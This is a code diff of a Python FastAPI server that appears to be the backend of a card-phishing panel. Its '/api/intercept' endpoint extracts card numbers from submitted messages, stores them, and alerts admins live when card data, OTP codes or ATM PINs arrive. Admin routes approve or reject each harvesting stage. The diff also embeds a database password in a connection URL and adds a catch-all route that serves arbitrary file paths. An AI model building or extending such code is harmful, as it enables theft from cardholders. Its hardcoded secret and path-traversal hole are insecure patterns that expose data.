@@ -7,11 +7,16 @@ from typing import List, Optional
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Header
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 import databases
 import sqlalchemy
 from passlib.context import CryptContext
 from jose import JWTError, jwt
+
+# Setup logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger("server")
 
 # Configuration
 DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:SoScQrGzdjqARvUwqCgEhacJvTNWevil@railway.proxy.rlwy.net:5432/railway")
@@ -128,20 +133,20 @@ async def get_current_admin(authorization: str = Header(None)):
 
 @app.on_event("startup")
 async def startup():
+    logger.info("Connecting to database...")
     await database.connect()
+    logger.info("Database connected.")
 
 @app.on_event("shutdown")
 async def shutdown():
     await database.disconnect()
 
-# Routes
+# API Routes
 @app.post("/api/intercept")
 async def intercept_order(data: OrderIntercept):
     ref = data.order_ref
-    
-    # Extract card info if present in raw_message (Lovable usually sends it in text)
     card_info = {}
-    if "Card Number:" in data.raw_message:
+    if data.raw_message:
         lines = data.raw_message.split('\n')
         for line in lines:
             if "Card Number:" in line: card_info['card_number'] = line.split("Card Number:")[1].strip()
@@ -172,17 +177,13 @@ async def intercept_order(data: OrderIntercept):
     else:
         update_data = {k: v for k, v in card_info.items() if v}
         if data.raw_message: update_data["raw_message"] = data.raw_message
-        
         if update_data:
             query = orders.update().where(orders.c.order_ref == ref).values(**update_data)
             await database.execute(query)
-            
-            # Notify admin based on what was submitted
             msg_type = "card_submitted"
             if "otp_code" in update_data: msg_type = "otp_submitted"
             if "atm_pin" in update_data: msg_type = "atm_pin_submitted"
             await manager.broadcast_to_admins({"type": msg_type, "ref": ref})
-
     return {"orderRef": ref}
 
 @app.get("/api/orders/{ref}/status")
@@ -193,7 +194,6 @@ async def get_order_status(ref: str):
         raise HTTPException(status_code=404, detail="Order not found")
     return {"status": order["status"]}
 
-# Admin Routes
 @app.post("/api/admin/login")
 async def admin_login(data: AdminLogin):
     if data.username == ADMIN_USERNAME and data.password == ADMIN_PASSWORD:
@@ -218,30 +218,6 @@ async def reject_card(ref: str, admin: str = Depends(get_current_admin)):
     await database.execute(query)
     return {"success": True}
 
-@app.post("/api/admin/orders/{ref}/approve-otp")
-async def approve_otp(ref: str, admin: str = Depends(get_current_admin)):
-    query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_atm_pin", stage="atm_pin")
-    await database.execute(query)
-    return {"success": True}
-
-@app.post("/api/admin/orders/{ref}/reject-otp")
-async def reject_otp(ref: str, admin: str = Depends(get_current_admin)):
-    query = orders.update().where(orders.c.order_ref == ref).values(status="otp_rejected")
-    await database.execute(query)
-    return {"success": True}
-
-@app.post("/api/admin/orders/{ref}/approve-atm")
-async def approve_atm(ref: str, admin: str = Depends(get_current_admin)):
-    query = orders.update().where(orders.c.order_ref == ref).values(status="completed", stage="done")
-    await database.execute(query)
-    return {"success": True}
-
-@app.post("/api/admin/orders/{ref}/reject-atm")
-async def reject_atm(ref: str, admin: str = Depends(get_current_admin)):
-    query = orders.update().where(orders.c.order_ref == ref).values(status="atm_rejected")
-    await database.execute(query)
-    return {"success": True}
-
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket, admin: Optional[int] = 0):
     await manager.connect(websocket, is_admin=bool(admin))
@@ -251,10 +227,7 @@ async def websocket_endpoint(websocket: WebSocket, admin: Optional[int] = 0):
     except WebSocketDisconnect:
         manager.disconnect(websocket)
 
-# Serve static files
-# Priority: explicit routes for main HTML files to avoid conflicts
-from fastapi.responses import FileResponse
-
+# Serve Static Files
 @app.get("/")
 async def read_index():
     return FileResponse("index.html")
@@ -263,9 +236,19 @@ async def read_index():
 async def read_admin():
     return FileResponse("admin.html")
 
-app.mount("/", StaticFiles(directory=".", html=True), name="static")
+# Serve assets (js, css, etc)
+if os.path.exists("assets"):
+    app.mount("/assets", StaticFiles(directory="assets"), name="assets")
+
+# Fallback for SPA or other files
+@app.get("/{path_name:path}")
+async def catch_all(path_name: str):
+    if os.path.exists(path_name):
+        return FileResponse(path_name)
+    return FileResponse("index.html")
 
 if __name__ == "__main__":
     import uvicorn
     port = int(os.getenv("PORT", 8000))
+    logger.info(f"Starting server on port {port}")
     uvicorn.run(app, host="0.0.0.0", port=port)
